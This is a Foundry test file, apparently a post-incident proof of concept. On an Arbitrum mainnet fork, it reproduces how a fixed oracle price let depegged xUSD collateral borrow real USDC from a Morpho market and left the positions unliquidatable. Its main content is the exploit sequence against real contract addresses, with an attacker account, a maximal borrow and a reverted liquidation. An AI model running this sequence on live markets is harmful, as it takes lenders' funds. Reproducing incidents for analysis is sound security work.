// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {IERC20, IOracle, IMorpho, MarketParams} from "../src/IMorpho.sol";

/// @notice Reproduces the core solvency defect behind the Stream Finance xUSD
/// collapse (2025-11-03/04) on an Arbitrum mainnet fork, using the REAL
/// Morpho Blue market, the REAL xUSD token, and the REAL price oracle.
///
/// Root cause reproduced: the xUSD/USDC market's oracle reports a FIXED
/// ~$1.27 valuation for xUSD that never reflects xUSD's real market price
/// (which fell to ~$0.10 after the $93M loss). Because Morpho trusts that
/// oracle, worthless xUSD still borrows real USDC, and underwater positions
/// stay "healthy" and cannot be liquidated -> lenders are left with bad debt.
contract StreamOracleForkTest is Test {
    // Real Arbitrum addresses
    IMorpho constant MORPHO = IMorpho(0x6c247b1F6182318877311737BaC0844bAa518F5e);
    bytes32 constant MARKET_ID = 0x9e90aec7d768403dacc9dd0d8320307fda3f980eed4df43e3e52168a1c667709;
    address constant USDC  = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831; // native Arbitrum USDC
    address constant XUSD  = 0x6eAf19b2FC24552925dB245F9Ff613157a7dbb4C; // Stream xUSD

    // Real-world xUSD market price after the collapse (~$0.10). Used only for the
    // "true value" comparison in logs; the on-chain oracle ignores it.
    uint256 constant XUSD_REAL_CENTS = 10; // $0.10

    address lender   = makeAddr("usdc_lender");
    address attacker = makeAddr("stream_borrower");

    MarketParams mp;

    function setUp() public {
        // Arbitrum, block 398,000,000 = 2025-11-08, days after the collapse.
        vm.createSelectFork(vm.rpcUrl("arbitrum"), 398_000_000);
        (address loan, address coll, address oracle, address irm, uint256 lltv) =
            MORPHO.idToMarketParams(MARKET_ID);
        mp = MarketParams(loan, coll, oracle, irm, lltv);
    }

    function test_HardcodedOracleLetsWorthlessCollateralBorrowRealUSDC() public {
        console2.log("==================================================================");
        console2.log(" Stream Finance xUSD collapse - Arbitrum fork (block 398,000,000)");
        console2.log(" REAL Morpho xUSD/USDC market, REAL oracle, REAL xUSD token");
        console2.log("==================================================================");

        // --- 1. The oracle vs. reality ---
        uint256 oraclePrice = IOracle(mp.oracle).price(); // 1e36-scaled, USDC per xUSD
        uint256 oracleUsdc1e6 = oraclePrice / 1e30;       // -> USDC (6dp) per 1 xUSD
        console2.log("Market LLTV (bps)               = %s", mp.lltv / 1e14);
        console2.log("Oracle says 1 xUSD is worth     = %s.%s USDC (on-chain)", oracleUsdc1e6 / 1e6, (oracleUsdc1e6 % 1e6) / 1e4);
        console2.log("Real market price of 1 xUSD     ~ 0.%s USDC (~90%% depeg, ignored by oracle)", XUSD_REAL_CENTS);

        // --- 2. Real frozen bad-debt state of the live market ---
        (uint128 tSupply,, uint128 tBorrow,,,) = MORPHO.market(MARKET_ID);
        console2.log("");
        console2.log("Live market state (real):");
        console2.log("  total USDC supplied  = %s USDC", uint256(tSupply) / 1e6);
        console2.log("  total USDC borrowed  = %s USDC", uint256(tBorrow) / 1e6);
        console2.log("  utilization          = %s %%", tSupply == 0 ? 0 : uint256(tBorrow) * 100 / tSupply);

        // --- 3. Live exploit: worthless xUSD borrows real USDC ---
        uint256 collateral = 1_000_000 * 1e6; // 1,000,000 xUSD (6dp)
        _fund(XUSD, attacker, collateral);
        _fund(USDC, lender, 2_000_000 * 1e6);

        // Lender supplies real USDC (so there is liquidity to borrow).
        vm.startPrank(lender);
        IERC20(USDC).approve(address(MORPHO), type(uint256).max);
        MORPHO.supply(mp, 1_500_000 * 1e6, 0, lender, "");
        vm.stopPrank();

        // Attacker posts worthless xUSD and borrows the max real USDC.
        uint256 realCollateralValue = collateral * XUSD_REAL_CENTS / 100; // ~$100k in truth
        uint256 maxBorrow = collateral * oraclePrice / 1e36 * mp.lltv / 1e18; // per the oracle
        uint256 borrowAmt = maxBorrow * 99 / 100;

        vm.startPrank(attacker);
        IERC20(XUSD).approve(address(MORPHO), type(uint256).max);
        MORPHO.supplyCollateral(mp, collateral, attacker, "");
        MORPHO.borrow(mp, borrowAmt, 0, attacker, attacker);
        vm.stopPrank();

        uint256 got = IERC20(USDC).balanceOf(attacker);
        console2.log("");
        console2.log("[EXPLOIT] worthless xUSD -> real USDC:");
        console2.log("  xUSD posted (real value ~$%s)  = 1,000,000 xUSD", realCollateralValue / 1e6);
        console2.log("  real USDC borrowed out         = %s USDC", got / 1e6);
        console2.log("  unbacked (bad debt) created    ~ %s USDC", (got - realCollateralValue) / 1e6);

        assertGt(got, realCollateralValue * 5, "should extract far more USDC than collateral is worth");

        // --- 4. The position cannot be liquidated (oracle says it is healthy) ---
        (, uint128 bShares,) = MORPHO.position(MARKET_ID, attacker);
        vm.startPrank(lender);
        vm.expectRevert(); // Morpho: position is healthy per the hardcoded oracle
        MORPHO.liquidate(mp, attacker, 0, bShares, "");
        vm.stopPrank();
        console2.log("");
        console2.log("[FROZEN] liquidate() REVERTS: position is 'healthy' per oracle,");
        console2.log("         so lenders can never claw back the USDC -> permanent bad debt.");
    }

    /// Try foundry `deal`; fall back to impersonating a whale is not needed here
    /// because both tokens expose a standard balanceOf slot.
    function _fund(address token, address to, uint256 amount) internal {
        deal(token, to, amount);
        require(IERC20(token).balanceOf(to) >= amount, "fund failed");
    }
}
